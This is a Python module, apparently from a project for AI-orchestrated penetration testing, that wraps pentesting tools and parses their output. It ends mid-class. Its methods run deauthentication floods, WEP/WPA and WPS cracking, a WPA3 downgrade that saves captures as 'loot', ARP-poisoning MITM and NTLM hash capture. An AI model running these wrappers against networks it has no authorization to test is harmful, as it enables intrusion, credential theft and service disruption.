"""
Parrot OS Tool Wrappers.

Structured Python interfaces around common pentesting CLIs.
Each wrapper executes via NativeLayer and parses raw output into
dictionaries suitable for the AI orchestrator or the GUI.
"""

import json
import re
import shlex
import xml.etree.ElementTree as ET
from typing import Optional
from james.layers.native import NativeLayer, CommandResult


class AircrackSuite:
    """Wrappers around airmon-ng, airodump-ng, aireplay-ng, aircrack-ng."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def list_interfaces(self) -> list[dict]:
        """List wireless interfaces and their current mode."""
        result = self.layer.run("iwconfig 2>/dev/null", timeout=10)
        interfaces = []
        current = {}
        for line in result.stdout.splitlines():
            if "no wireless extensions" in line:
                if current:
                    interfaces.append(current)
                    current = {}
                continue
            if (
                line
                and (not line.startswith(" "))
                and (not line.startswith("\t"))
            ):
                if current:
                    interfaces.append(current)
                iface = line.split()[0]
                mode = "unknown"
                if "Mode:" in line:
                    mode = line.split("Mode:")[1].split()[0]
                current = {"interface": iface, "mode": mode}
            elif current and "Mode:" in line:
                current["mode"] = line.split("Mode:")[1].split()[0]
        if current:
            interfaces.append(current)
        return interfaces

    def enable_monitor(self, interface: str) -> CommandResult:
        """Put an interface into monitor mode via airmon-ng."""
        return self.layer.run(
            f"airmon-ng start {interface}", sudo=True, timeout=30
        )

    def disable_monitor(self, interface: str) -> CommandResult:
        """Restore managed mode via airmon-ng."""
        return self.layer.run(
            f"airmon-ng stop {interface}", sudo=True, timeout=30
        )

    def check_kill(self) -> CommandResult:
        """Kill processes that might interfere with monitor mode."""
        return self.layer.run("airmon-ng check kill", sudo=True, timeout=15)

    def start_airodump(
        self,
        interface: str,
        *,
        channel: Optional[int] = None,
        bssid: Optional[str] = None,
        write_prefix: Optional[str] = None,
    ):
        """
        Start airodump-ng in the background. Returns the Popen handle.

        The caller should use NativeLayer.kill_background(proc) to stop it.
        """
        parts = ["airodump-ng"]
        if channel:
            parts.append(f"--channel {channel}")
        if bssid:
            parts.append(f"--bssid {bssid}")
        if write_prefix:
            parts.append(f"-w {write_prefix}")
            parts.append("--output-format pcap,csv")
        parts.append(interface)
        return self.layer.run_background(" ".join(parts), sudo=True)

    @staticmethod
    def parse_airodump_csv(csv_content: str) -> dict:
        """Parse the airodump-ng CSV format and return APs and Stations.

        Accepts either raw CSV text or a file path string.
        """
        import logging

        logger = logging.getLogger(__name__)

        # If csv_content looks like a file path, read it
        import os

        if os.path.isfile(csv_content):
            try:
                with open(
                    csv_content, "r", encoding="utf-8", errors="ignore"
                ) as f:
                    csv_content = f.read()
            except Exception as e:
                logger.warning(
                    "Could not read CSV file %s: %s", csv_content, e
                )
                return {"aps": [], "stations": []}

        aps = []
        stations = []
        section = 0
        for line in csv_content.splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("BSSID,"):
                section = 1
                continue
            elif line.startswith("Station MAC,"):
                section = 3
                continue
            try:
                parts = [p.strip() for p in line.split(",")]
                if section == 1 and len(parts) >= 14:
                    bssid = parts[0]
                    try:
                        power = int(parts[8])
                    except ValueError:
                        power = -100
                    aps.append(
                        {
                            "bssid": bssid,
                            "channel": parts[3],
                            "privacy": parts[5],
                            "power": power,
                            "essid": parts[13] if len(parts) > 13 else "",
                        }
                    )
                elif section == 3 and len(parts) >= 6:
                    station_mac = parts[0]
                    connected_bssid = parts[5]
                    try:
                        cli_power = int(parts[3])
                    except (ValueError, IndexError):
                        cli_power = -100
                    # Probed SSIDs are in column 6+
                    probes = (
                        ",".join(p.strip() for p in parts[6:] if p.strip())
                        if len(parts) > 6
                        else ""
                    )
                    stations.append(
                        {
                            "station_mac": station_mac,
                            "bssid": (
                                connected_bssid
                                if connected_bssid != "(not associated)"
                                else ""
                            ),
                            "power": cli_power,
                            "probes": probes,
                        }
                    )
            except Exception as e:
                logger.debug(
                    "Failed to parse airodump CSV line: '%s'. Error: %s",
                    line,
                    e,
                )
        return {"aps": aps, "stations": stations}

    def deauth(
        self,
        interface: str,
        bssid: str,
        *,
        count: int = 10,
        client: Optional[str] = None,
    ) -> CommandResult:
        """Send deauthentication frames."""
        client_arg = f"-c {shlex.quote(client)}" if client else ""
        cmd = f"aireplay-ng -0 {count} -a {shlex.quote(bssid)} {client_arg} -D {shlex.quote(interface)}"
        return self.layer.run(cmd, sudo=True, timeout=60)

    def crack_wpa(
        self, capture_file: str, wordlist: str, *, bssid: Optional[str] = None
    ) -> dict:
        """
        Run aircrack-ng against a capture file.
        Returns dict with 'found', 'key', and raw output.
        """
        bssid_arg = f"-b {shlex.quote(bssid)}" if bssid else ""
        cmd = f"aircrack-ng {bssid_arg} -w {shlex.quote(wordlist)} {shlex.quote(capture_file)}"
        result = self.layer.run(cmd, timeout=600)
        found = False
        key = ""
        for line in result.stdout.splitlines():
            if "KEY FOUND!" in line:
                found = True
                match = re.search("\\[\\s*(.+?)\\s*\\]", line)
                if match:
                    key = match.group(1)
                break
        return {
            "command": cmd,
            "found": found,
            "key": key,
            "returncode": result.returncode,
            "output": result.stdout[-2000:],
        }

    def check_handshake(self, capture_file: str, bssid: str) -> bool:
        """Check if a valid handshake exists in the capture file."""
        cmd = (
            f"aircrack-ng -b {shlex.quote(bssid)} {shlex.quote(capture_file)}"
        )
        result = self.layer.run(cmd, timeout=10)
        return (
            "1 handshake" in result.stdout
            or "WPA (1 handshake)" in result.stdout
        )

    def fake_auth(
        self, interface: str, bssid: str, *, delay: int = 0
    ) -> CommandResult:
        """Perform fake authentication against a WEP AP."""
        cmd = f"aireplay-ng -1 {delay} -e '' -a {shlex.quote(bssid)} -h $(macchanger -s {shlex.quote(interface)} | grep -oP '[0-9a-f:]+' | head -1) {shlex.quote(interface)}"
        return self.layer.run(cmd, sudo=True, timeout=30)

    def arp_replay(
        self, interface: str, bssid: str, *, timeout: int = 300
    ) -> CommandResult:
        """ARP request replay attack to generate IVs for WEP cracking."""
        cmd = (
            f"aireplay-ng -3 -b {shlex.quote(bssid)} {shlex.quote(interface)}"
        )
        return self.layer.run(cmd, sudo=True, timeout=timeout)

    def chopchop(
        self, interface: str, bssid: str, *, timeout: int = 300
    ) -> dict:
        """KoreK chopchop attack — decrypt a WEP packet without the key."""
        cmd = f"aireplay-ng -4 -b {shlex.quote(bssid)} {shlex.quote(interface)} -F"
        result = self.layer.run(cmd, sudo=True, timeout=timeout)
        return {
            "command": cmd,
            "success": "Use packetforge-ng" in result.stdout
            or result.returncode == 0,
            "output": result.stdout[-2000:],
        }

    def fragment_attack(
        self, interface: str, bssid: str, *, timeout: int = 300
    ) -> dict:
        """Fragmentation attack — obtain a PRGA keystream from WEP."""
        cmd = f"aireplay-ng -5 -b {shlex.quote(bssid)} {shlex.quote(interface)} -F"
        result = self.layer.run(cmd, sudo=True, timeout=timeout)
        return {
            "command": cmd,
            "success": "Use packetforge-ng" in result.stdout
            or result.returncode == 0,
            "output": result.stdout[-2000:],
        }

    def crack_wep(
        self, capture_file: str, *, bssid: Optional[str] = None
    ) -> dict:
        """Crack WEP key from captured IVs."""
        bssid_arg = f"-b {shlex.quote(bssid)}" if bssid else ""
        cmd = f"aircrack-ng {bssid_arg} {shlex.quote(capture_file)}"
        result = self.layer.run(cmd, timeout=300)
        found = False
        key = ""
        for line in result.stdout.splitlines():
            if "KEY FOUND!" in line:
                found = True
                match = re.search("\\[\\s*(.+?)\\s*\\]", line)
                if match:
                    key = match.group(1)
                break
        return {
            "command": cmd,
            "found": found,
            "key": key,
            "output": result.stdout[-2000:],
        }

    def interactive_replay(
        self, interface: str, bssid: str, *, timeout: int = 120
    ) -> CommandResult:
        """Interactive packet selection replay (aireplay-ng -2)."""
        cmd = f"aireplay-ng -2 -b {shlex.quote(bssid)} -F {shlex.quote(interface)}"
        return self.layer.run(cmd, sudo=True, timeout=timeout)


class Hashcat:
    """Wrapper around hashcat."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def crack(
        self,
        hash_file: str,
        wordlist: str,
        *,
        hash_mode: int = 0,
        rules: Optional[str] = None,
        auto_rules: bool = False,
        timeout: int = 600,
    ) -> dict:
        """Crack hashes with an optional rule set.

        auto_rules=True applies the best64 rule automatically when no
        explicit *rules* file is supplied.
        """
        if auto_rules and not rules:
            rules = "best64"
        rules_arg = f"-r {shlex.quote(rules)}" if rules else ""
        cmd = (
            f"hashcat -m {int(hash_mode)} {rules_arg} "
            f"{shlex.quote(hash_file)} {shlex.quote(wordlist)} --force --potfile-disable"
        )
        result = self.layer.run(cmd, timeout=timeout)
        cracked = self._parse_cracked(result.stdout)
        return {
            "command": cmd,
            "success": result.returncode
            in (0, 1),  # 1 = exhausted but no error
            "found": bool(cracked),
            "total_cracked": len(cracked),
            "cracked_keys": cracked,
            "output": result.stdout[-3000:],
            "stderr": result.stderr[-1000:],
        }

    def crack_cascading(
        self,
        hash_file: str,
        wordlist: str,
        *,
        hash_mode: int = 0,
        timeout_per_stage: int = 300,
    ) -> dict:
        """Try progressively aggressive hashcat stages until keys are found.

        Stages:
          1. Straight wordlist (no rules)
          2. best64 rules
          3. rockyou-30000 rules (if available)
        """
        stages = [
            ("straight", None),
            ("best64", "best64"),
            ("rockyou-30000", "rockyou-30000"),
        ]
        stages_tried: list[str] = []
        all_cracked: list[dict] = []

        for stage_name, rules in stages:
            stages_tried.append(stage_name)
            rules_arg = f"-r {shlex.quote(rules)}" if rules else ""
            cmd = (
                f"hashcat -m {int(hash_mode)} {rules_arg} "
                f"{shlex.quote(hash_file)} {shlex.quote(wordlist)} "
                f"--force --potfile-disable"
            )
            result = self.layer.run(cmd, timeout=timeout_per_stage)
            cracked = self._parse_cracked(result.stdout)
            if cracked:
                all_cracked.extend(cracked)
                return {
                    "found": True,
                    "total_cracked": len(all_cracked),
                    "cracked_keys": all_cracked,
                    "winning_stage": stage_name,
                    "stages_tried": stages_tried,
                }

        return {
            "found": False,
            "total_cracked": 0,
            "cracked_keys": [],
            "stages_tried": stages_tried,
        }

    def crack_wifi_enhanced(
        self,
        hash_file: str,
        wordlist: str,
        *,
        hash_mode: int = 22000,
        ssid: str = "",
        timeout_per_stage: int = 300,
    ) -> dict:
        """Wi-Fi optimised hashcat pipeline:
        1. best64 rules on provided wordlist
        2. Mask attack (8-digit PIN patterns common on routers)
        3. Cascading rule stages fallback
        """
        stages_tried: list[str] = []

        # Stage 1: best64 rules on provided wordlist
        stages_tried.append("james-best64")
        cmd = (
            f"hashcat -m {int(hash_mode)} -r best64 "
            f"{shlex.quote(hash_file)} {shlex.quote(wordlist)} "
            f"--force --potfile-disable"
        )
        result = self.layer.run(cmd, timeout=timeout_per_stage)
        cracked = self._parse_cracked(result.stdout)
        if cracked:
            return {
                "found": True,
                "cracked_keys": cracked,
                "winning_stage": "james-best64",
                "stages_tried": stages_tried,
            }

        # Stage 2: 8-digit numeric mask (common default router PINs)
        stages_tried.append("mask-8digit")
        cmd = (
            f"hashcat -m {int(hash_mode)} -a 3 "
            f"{shlex.quote(hash_file)} ?d?d?d?d?d?d?d?d "
            f"--force --potfile-disable"
        )
        result = self.layer.run(cmd, timeout=timeout_per_stage)
        cracked = self._parse_cracked(result.stdout)
        if cracked:
            return {
                "found": True,
                "cracked_keys": cracked,
                "winning_stage": "mask-8digit",
                "stages_tried": stages_tried,
            }

        # Stage 3: cascading rules fallback
        cascade = self.crack_cascading(
            hash_file,
            wordlist,
            hash_mode=hash_mode,
            timeout_per_stage=timeout_per_stage,
        )
        stages_tried.extend(cascade.get("stages_tried", []))
        if cascade.get("found"):
            cascade["stages_tried"] = stages_tried
            return cascade

        return {
            "found": False,
            "cracked_keys": [],
            "stages_tried": stages_tried,
        }

    @staticmethod
    def _parse_cracked(output: str) -> list[dict]:
        """Extract cracked hash:plain pairs from hashcat stdout."""
        cracked: list[dict] = []
        for line in output.splitlines():
            line = line.strip()
            # hashcat prints "hash:plain" on crack lines
            if (
                ":" in line
                and not line.startswith("[")
                and not line.startswith("#")
            ):
                parts = line.split(":")
                if len(parts) >= 2:
                    plain = parts[-1].strip()
                    hash_val = ":".join(parts[:-1])
                    if plain and len(plain) >= 8:  # WPA keys are >= 8 chars
                        cracked.append({"hash": hash_val, "plain": plain})
        return cracked

    def identify_hash(self, hash_value: str) -> dict:
        """Use hashcat's built-in hash identification (--identify)."""
        cmd = f"echo {hash_value!r} | hashcat --identify"
        result = self.layer.run(cmd, timeout=30)
        return {"output": result.stdout, "stderr": result.stderr}


class Hcxtools:
    """Wrapper around hcxdumptool and hcxpcapngtool for clientless PMKID attacks."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def capture_pmkid(
        self, interface: str, output_pcapng: str, *, timeout: int = 600
    ) -> dict:
        """Run hcxdumptool to capture PMKID hashes from nearby APs."""
        cmd = f"timeout {int(timeout)} hcxdumptool -i {shlex.quote(interface)} -o {shlex.quote(output_pcapng)} --enable_status=15"
        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
        return {
            "command": cmd,
            "output": result.stdout[-2000:],
            "stderr": result.stderr[-2000:],
        }

    def extract_hashes(self, pcapng_file: str, output_hash_file: str) -> dict:
        """Extract crackable hashes (hc22000 format) from a pcapng using hcxpcapngtool."""
        cmd = f"hcxpcapngtool -o {shlex.quote(output_hash_file)} {shlex.quote(pcapng_file)}"
        result = self.layer.run(cmd, timeout=30)
        pmkid_count = 0
        eapol_count = 0
        for line in result.stdout.splitlines():
            if "PMKID(s) written" in line:
                match = re.search("(\\d+)\\s+PMKID", line)
                if match:
                    pmkid_count = int(match.group(1))
            if "EAPOL message pairs written" in line or "EAPOL M1/M2" in line:
                match = re.search("(\\d+)\\s+EAPOL", line)
                if match:
                    eapol_count = int(match.group(1))
        return {
            "command": cmd,
            "success": pmkid_count > 0 or eapol_count > 0,
            "pmkid_count": pmkid_count,
            "eapol_count": eapol_count,
            "output": result.stdout,
        }


class WPA3Tools:
    """Wrapper for WPA3 / SAE tools and attacks."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def check_sae_support(
        self, interface: str, bssid: str, timeout: int = 15
    ) -> dict:
        """
        Check if an AP supports WPA3 (SAE) or OWE, and detect transition mode.
        Runs a quick airodump-ng scan and parses the output.
        """
        import tempfile
        import os

        result_dict = {
            "supports_sae": False,
            "supports_owe": False,
            "transition_mode": False,
        }

        with tempfile.TemporaryDirectory() as tempdir:
            out_prefix = os.path.join(tempdir, "wpa3check")
            cmd = f"airodump-ng {shlex.quote(interface)} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format csv"
            self.layer.run(f"timeout {timeout} {cmd}", sudo=True)

            csv_file = f"{out_prefix}-01.csv"
            if os.path.exists(csv_file):
                try:
                    with open(
                        csv_file, "r", encoding="utf-8", errors="ignore"
                    ) as f:
                        lines = f.readlines()

                        # Find the BSSID line
                        for line in lines:
                            if line.startswith(bssid.upper()):
                                parts = [p.strip() for p in line.split(",")]
                                if len(parts) > 7:
                                    auth = parts[7].upper()
                                    cipher = parts[6].upper()

                                    # Very basic check based on typical airodump-ng CSV output
                                    if "SAE" in auth or "WPA3" in auth:
                                        result_dict["supports_sae"] = True
                                    if "OWE" in auth:
                                        result_dict["supports_owe"] = True

                                    # Transition mode typically shows WPA2/WPA3 mixed or PSK+SAE
                                    if (
                                        ("PSK" in auth and "SAE" in auth)
                                        or (
                                            "WPA2" in cipher
                                            and "WPA3" in cipher
                                        )
                                        or (
                                            result_dict["supports_sae"]
                                            and "PSK" in auth
                                        )
                                    ):
                                        result_dict["transition_mode"] = True
                                        result_dict["supports_sae"] = True
                                break
                except Exception:
                    pass

        return result_dict

    def downgrade_attack(
        self,
        interface: str,
        bssid: str,
        channel: int = None,
        timeout: int = 30,
    ) -> dict:
        """
        Perform a WPA3 transition mode downgrade attack (Dragonblood style).
        Sends deauth frames forcing WPA2 fallback, while listening for a WPA2 handshake.
        """
        import tempfile
        import os
        import time
        import glob

        result_dict = {"success": False, "log": [], "capture_file": None}

        if not channel:
            result_dict["log"].append(
                "Error: Channel is required for downgrade attack."
            )
            return result_dict

        with tempfile.TemporaryDirectory() as tempdir:
            out_prefix = os.path.join(tempdir, "downgrade")

            # Start airodump-ng in the background to capture handshakes
            dump_cmd = f"airodump-ng {shlex.quote(interface)} -c {channel} --bssid {shlex.quote(bssid)} -w {shlex.quote(out_prefix)} --output-format pcap"
            dump_result = self.layer.run_background(dump_cmd, sudo=True)
            result_dict["log"].append(f"Started capture on ch {channel}...")

            # Let it spin up
            time.sleep(2)

            # Send continuous deauths
            result_dict["log"].append(
                "Sending forced deauths to trigger WPA2 fallback..."
            )
            deauth_cmd = f"aireplay-ng -0 5 -a {shlex.quote(bssid)} {shlex.quote(interface)}"
            self.layer.run(deauth_cmd, sudo=True)

            time.sleep(timeout - 2)

            # Kill airodump-ng
            self.layer.kill_background(dump_result)
            time.sleep(1)

            # Look for PCAP and check for handshakes (via aircrack-ng)
            pcaps = glob.glob(f"{out_prefix}-*.cap") + glob.glob(
                f"{out_prefix}-*.pcap"
            )
            if pcaps:
                pcap_file = pcaps[0]
                check_cmd = f"aircrack-ng {shlex.quote(pcap_file)}"
                check_result = self.layer.run(check_cmd)
                if (
                    "1 handshake" in check_result.stdout
                    or "WPA (1 handshake)" in check_result.stdout
                ):
                    result_dict["success"] = True
                    result_dict["log"].append(
                        "Successfully forced downgrade and captured WPA2 handshake!"
                    )

                    # Copy to a persistent location
                    import shutil

                    persist_dir = os.path.expanduser("~/.james/loot")
                    os.makedirs(persist_dir, exist_ok=True)
                    dest_file = os.path.join(
                        persist_dir, f"downgrade_{bssid.replace(':', '')}.pcap"
                    )
                    shutil.copy2(pcap_file, dest_file)
                    result_dict["capture_file"] = dest_file
                else:
                    result_dict["log"].append(
                        "Deauths sent, but no WPA2 handshake captured."
                    )
            else:
                result_dict["log"].append("Error: No capture file generated.")

        return result_dict


class Nmap:
    """Wrappers around nmap port and service scanning."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def quick_scan(self, target: str, *, timeout: int = 120) -> dict:
        """Fast SYN scan of the top 1000 ports."""
        cmd = f"nmap -T4 -F --open -oX - {shlex.quote(target)}"
        result = self.layer.run(cmd, timeout=timeout)
        return self._parse_xml(cmd, result)

    def scan(
        self,
        target: str,
        ports: str = "1-65535",
        flags: str = "-sV -sC",
        *,
        sudo: bool = False,
        timeout: int = 600,
    ) -> dict:
        """Full port + service/script scan."""
        cmd = f"nmap {flags} -p {ports} --open -oX - {shlex.quote(target)}"
        result = self.layer.run(cmd, sudo=sudo, timeout=timeout)
        return self._parse_xml(cmd, result)

    def os_detect(self, target: str, *, timeout: int = 120) -> dict:
        """OS fingerprinting (requires root for raw-socket probes)."""
        cmd = f"nmap -O --osscan-guess -oX - {shlex.quote(target)}"
        result = self.layer.run(cmd, sudo=True, timeout=timeout)
        parsed = self._parse_xml(cmd, result)
        # Augment with OS match details from XML
        try:
            root = ET.fromstring(result.stdout)
            for host_el in root.findall("host"):
                addr = ""
                addr_el = host_el.find("address")
                if addr_el is not None:
                    addr = addr_el.get("addr", "")
                os_el = host_el.find("os")
                os_matches = []
                if os_el is not None:
                    for match in os_el.findall("osmatch"):
                        os_matches.append(
                            {
                                "name": match.get("name", ""),
                                "accuracy": match.get("accuracy", "0"),
                            }
                        )
                for h in parsed.get("hosts", []):
                    if h.get("address") == addr:
                        h["os_matches"] = os_matches
        except ET.ParseError:
            pass
        return parsed

    @staticmethod
    def _parse_xml(cmd: str, result) -> dict:
        """Parse nmap XML output into a structured dict."""
        hosts = []
        try:
            root = ET.fromstring(result.stdout)
            for host_el in root.findall("host"):
                addr_el = host_el.find("address")
                addr = addr_el.get("addr", "") if addr_el is not None else ""
                ports = []
                for port_el in host_el.iter("port"):
                    state_el = port_el.find("state")
                    if (
                        state_el is not None
                        and state_el.get("state") == "open"
                    ):
                        svc_el = port_el.find("service")
                        svc = ""
                        version = ""
                        if svc_el is not None:
                            svc = svc_el.get("name", "")
                            product = svc_el.get("product", "")
                            ver = svc_el.get("version", "")
                            version = f"{product} {ver}".strip()
                        ports.append(
                            {
                                "port": port_el.get("portid", ""),
                                "proto": port_el.get("protocol", "tcp"),
                                "service": svc,
                                "version": version,
                            }
                        )
                hosts.append({"address": addr, "ports": ports})
        except ET.ParseError:
            pass

        return {
            "command": cmd,
            "hosts": hosts,
            "host_count": len(hosts),
            "returncode": result.returncode,
            "raw": result.stdout[-3000:],
        }


class John:
    """Wrapper around John the Ripper password cracker."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def crack(
        self,
        hash_file: str,
        wordlist: Optional[str] = None,
        fmt: Optional[str] = None,
        *,
        timeout: int = 300,
    ) -> dict:
        """Run john against a hash file."""
        wl_arg = f"--wordlist={shlex.quote(wordlist)}" if wordlist else ""
        fmt_arg = f"--format={shlex.quote(fmt)}" if fmt else ""
        cmd = f"john {fmt_arg} {wl_arg} {shlex.quote(hash_file)}"
        result = self.layer.run(cmd, timeout=timeout)
        return {
            "command": cmd,
            "success": result.returncode == 0,
            "output": result.stdout[-2000:],
            "stderr": result.stderr[-500:],
        }

    def show(self, hash_file: str) -> dict:
        """Show already-cracked hashes from john's pot file."""
        cmd = f"john --show {shlex.quote(hash_file)}"
        result = self.layer.run(cmd, timeout=15)
        return {
            "command": cmd,
            "output": result.stdout,
        }


class TheHarvester:
    """Wrapper around theHarvester OSINT framework."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def harvest(
        self,
        domain: str,
        sources: str = "bing,google,duckduckgo,crtsh",
        *,
        limit: int = 500,
        timeout: int = 120,
    ) -> dict:
        """Run theHarvester against a domain and parse results."""
        cmd = (
            f"theHarvester -d {shlex.quote(domain)} "
            f"-b {shlex.quote(sources)} -l {int(limit)}"
        )
        result = self.layer.run(cmd, timeout=timeout)
        emails: list[str] = []
        subdomains: list[str] = []
        ips: list[str] = []

        in_emails = False
        in_hosts = False
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if "[*] Emails found:" in line or "Emails found:" in line:
                in_emails = True
                in_hosts = False
                continue
            if (
                "[*] Hosts found:" in line
                or "Hosts found:" in line
                or "[*] IPs found:" in line
            ):
                in_hosts = True
                in_emails = False
                continue
            if line.startswith("[*]") or line.startswith("---"):
                in_emails = False
                in_hosts = False
            if in_emails and stripped and "@" in stripped:
                emails.append(stripped)
            if in_hosts and stripped:
                # Lines may be "subdomain: ip" or just "subdomain"
                if ":" in stripped:
                    sub, _, ip = stripped.partition(":")
                    subdomains.append(sub.strip())
                    ip = ip.strip()
                    if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                        ips.append(ip)
                elif "." in stripped:
                    subdomains.append(stripped)

        return {
            "command": cmd,
            "emails": list(set(emails)),
            "email_count": len(set(emails)),
            "subdomains": list(set(subdomains)),
            "subdomain_count": len(set(subdomains)),
            "ips": list(set(ips)),
            "returncode": result.returncode,
            "raw": result.stdout[-3000:],
        }


class Wafw00f:
    """Wrapper around wafw00f WAF detection tool."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def detect(self, url: str, *, timeout: int = 30) -> dict:
        """Detect a Web Application Firewall on the target URL."""
        cmd = f"wafw00f {shlex.quote(url)} -o -"
        result = self.layer.run(cmd, timeout=timeout)
        waf_detected = False
        waf_name = ""
        output = result.stdout + result.stderr

        for line in output.splitlines():
            low = line.lower()
            if (
                "is behind" in low
                or "protected by" in low
                or "detected" in low
            ):
                waf_detected = True
                # Try to extract the WAF name
                m = re.search(
                    r"(?:behind|protected by|detected)\s+([A-Za-z0-9 _\-]+)",
                    line,
                    re.IGNORECASE,
                )
                if m:
                    waf_name = m.group(1).strip()
                break
            if "no waf detected" in low or "not protected" in low:
                waf_detected = False
                break

        return {
            "command": cmd,
            "waf_detected": waf_detected,
            "waf_name": waf_name,
            "output": output[-1500:],
        }


class Ettercap:
    """Wrapper around ettercap ARP-poisoning MITM tool."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def arp_poison(
        self,
        interface: str,
        victim: str,
        gateway: str,
        *,
        timeout: int = 60,
    ) -> dict:
        """Run an ARP-poisoning MITM attack for a given duration."""
        cmd = (
            f"ettercap -T -q -i {shlex.quote(interface)} "
            f"-M arp:remote /{shlex.quote(victim)}// /{shlex.quote(gateway)}//"
        )
        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
        return {
            "command": cmd,
            "success": result.returncode == 0,
            "output": result.stdout[-2000:],
            "stderr": result.stderr[-500:],
        }


class Masscan:
    """Wrapper around masscan ultra-fast port scanner."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def scan(
        self,
        target: str,
        ports: str = "0-65535",
        *,
        rate: int = 1000,
        timeout: int = 120,
    ) -> dict:
        """Run masscan and return structured open-port results."""
        cmd = (
            f"masscan {shlex.quote(target)} -p{ports} "
            f"--rate={int(rate)} --wait 2 -oJ -"
        )
        result = self.layer.run(cmd, sudo=True, timeout=timeout)
        hosts: list[dict] = []
        try:
            # masscan JSON output can be a list of objects
            data = json.loads(result.stdout or "[]")
            if not isinstance(data, list):
                data = []
            for entry in data:
                ip = entry.get("ip", "")
                for p in entry.get("ports", []):
                    hosts.append(
                        {
                            "ip": ip,
                            "port": str(p.get("port", "")),
                            "proto": p.get("proto", "tcp"),
                            "status": p.get("status", "open"),
                        }
                    )
        except (json.JSONDecodeError, Exception):
            # Fall back to line-based parsing
            for line in result.stdout.splitlines():
                m = re.search(
                    r"Discovered open port (\d+)/(\w+) on ([\d.]+)", line
                )
                if m:
                    hosts.append(
                        {
                            "ip": m.group(3),
                            "port": m.group(1),
                            "proto": m.group(2),
                            "status": "open",
                        }
                    )

        return {
            "command": cmd,
            "hosts": hosts,
            "count": len(hosts),
            "returncode": result.returncode,
            "raw": result.stdout[-2000:],
        }


class Reaver:
    """Wrappers around wash (WPS scanner) and reaver (WPS PIN cracker)."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def wash_scan(self, interface: str, *, timeout: int = 15) -> dict:
        """Scan for WPS-enabled access points using wash."""
        cmd = f"wash -i {shlex.quote(interface)} -s -C 2>/dev/null"
        result = self.layer.run(cmd, sudo=True, timeout=timeout + 5)
        aps: list[dict] = []
        for line in result.stdout.splitlines():
            stripped = line.strip()
            if (
                not stripped
                or stripped.startswith("BSSID")
                or stripped.startswith("-")
            ):
                continue
            parts = stripped.split()
            if len(parts) >= 5 and re.match(
                r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", parts[0]
            ):
                aps.append(
                    {
                        "bssid": parts[0],
                        "channel": parts[1] if len(parts) > 1 else "",
                        "rssi": parts[2] if len(parts) > 2 else "",
                        "wps_version": parts[3] if len(parts) > 3 else "",
                        "wps_locked": (
                            parts[4].upper() == "YES"
                            if len(parts) > 4
                            else False
                        ),
                        "essid": " ".join(parts[5:]) if len(parts) > 5 else "",
                    }
                )
        return {
            "command": cmd,
            "aps": aps,
            "count": len(aps),
            "output": result.stdout[-2000:],
        }

    def pixie_dust(
        self,
        interface: str,
        bssid: str,
        *,
        channel: int = 0,
        timeout: int = 60,
    ) -> dict:
        """Attempt a WPS Pixie Dust offline attack using reaver."""
        ch_arg = f"-c {int(channel)}" if channel else ""
        cmd = (
            f"reaver -i {shlex.quote(interface)} "
            f"-b {shlex.quote(bssid)} {ch_arg} "
            f"-K 1 -vv -N 2>/dev/null"
        )
        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
        pin = ""
        wpa_psk = ""
        success = False
        for line in result.stdout.splitlines():
            if "WPS PIN:" in line:
                m = re.search(r"WPS PIN:\s*'?([0-9]+)'?", line)
                if m:
                    pin = m.group(1)
                    success = True
            if "WPA PSK:" in line:
                m = re.search(r"WPA PSK:\s*'?(.+?)'?$", line)
                if m:
                    wpa_psk = m.group(1).strip().strip("'\"")
        return {
            "command": cmd,
            "success": success,
            "pin": pin,
            "wpa_psk": wpa_psk,
            "output": result.stdout[-2000:],
        }

    def brute_force(
        self,
        interface: str,
        bssid: str,
        *,
        channel: int = 0,
        timeout: int = 600,
    ) -> dict:
        """Full WPS PIN brute-force via reaver."""
        ch_arg = f"-c {int(channel)}" if channel else ""
        cmd = (
            f"reaver -i {shlex.quote(interface)} "
            f"-b {shlex.quote(bssid)} {ch_arg} "
            f"-vv -N 2>/dev/null"
        )
        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
        pin = ""
        wpa_psk = ""
        success = False
        progress = ""
        for line in result.stdout.splitlines():
            if "WPS PIN:" in line:
                m = re.search(r"WPS PIN:\s*'?([0-9]+)'?", line)
                if m:
                    pin = m.group(1)
                    success = True
            if "WPA PSK:" in line:
                m = re.search(r"WPA PSK:\s*'?(.+?)'?$", line)
                if m:
                    wpa_psk = m.group(1).strip().strip("'\"")
            if "%" in line:
                progress = line.strip()
        return {
            "command": cmd,
            "success": success,
            "pin": pin,
            "wpa_psk": wpa_psk,
            "progress": progress,
            "output": result.stdout[-2000:],
        }


class Responder:
    """Wrapper around Responder LLMNR/NBT-NS/MDNS poisoner."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def start(self, interface: str, *, timeout: int = 60) -> dict:
        """Run Responder on the given interface to capture NTLM hashes."""
        cmd = f"responder -I {shlex.quote(interface)} -rdwv"
        result = self.layer.run(cmd, sudo=True, timeout=timeout + 10)
        hashes: list[str] = []
        for line in result.stdout.splitlines():
            # Responder prints hash lines like: [SMB] NTLMv2 ...
            if "NTLMv" in line or "Hash" in line:
                hashes.append(line.strip())
        return {
            "command": cmd,
            "success": result.returncode == 0,
            "hashes": hashes,
            "hash_count": len(hashes),
            "output": result.stdout[-3000:],
        }


class Sslscan:
    """Wrapper around sslscan TLS auditing tool."""

    def __init__(self, layer: NativeLayer):
        self.layer = layer

    def scan(self, target: str, *, timeout: int = 60) -> dict:
        """Audit SSL/TLS configuration on a host."""
